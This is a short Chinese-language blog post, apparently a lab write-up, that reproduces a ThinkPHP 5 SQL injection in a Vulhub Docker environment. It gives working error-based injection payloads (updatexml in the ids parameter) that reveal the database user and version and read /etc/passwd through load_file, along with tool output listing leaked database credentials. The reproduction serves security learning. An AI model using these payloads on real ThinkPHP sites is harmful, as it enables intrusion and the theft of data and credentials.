---
title: 【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露
date: 2025-09-04
categories:
  - Web攻防
  - 靶场
  - 红队
image: images/32.webp
---
# 环境搭建
```
进入Vulhub
cd vulhub-master\thinkphp\in-sqlinjection
docker compose up -d # 启动后为空白页面，需通过Payload触发漏洞
```
搭建好后是空白页面
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104644.png)

# 漏洞利用
## 报错注入 Payload：
```
http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user(),0xa),0)]=1
```
- 执行后会显示数据库用户信息（如`root@localhost`）。
## 信息泄露利用：
- 获取数据库版本：`ids[0,updatexml(0,concat(0xa,version()),0)]=1`
- 读取文件：`ids[0,load_file('/etc/passwd')]=1`（需数据库权限）
利用报错来查看版本信息
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104802.png)
利用工具进行测试：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104819.png)
# 其他
```
[+] 存在ThinkPHP 5 SQL注入漏洞 && 敏感信息泄露
Payload: http://localhost//index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
[+] 存在ThinkPHP 5.x 数据库信息泄露
Payload: username:root hostname:mysql password:root database:cat
```
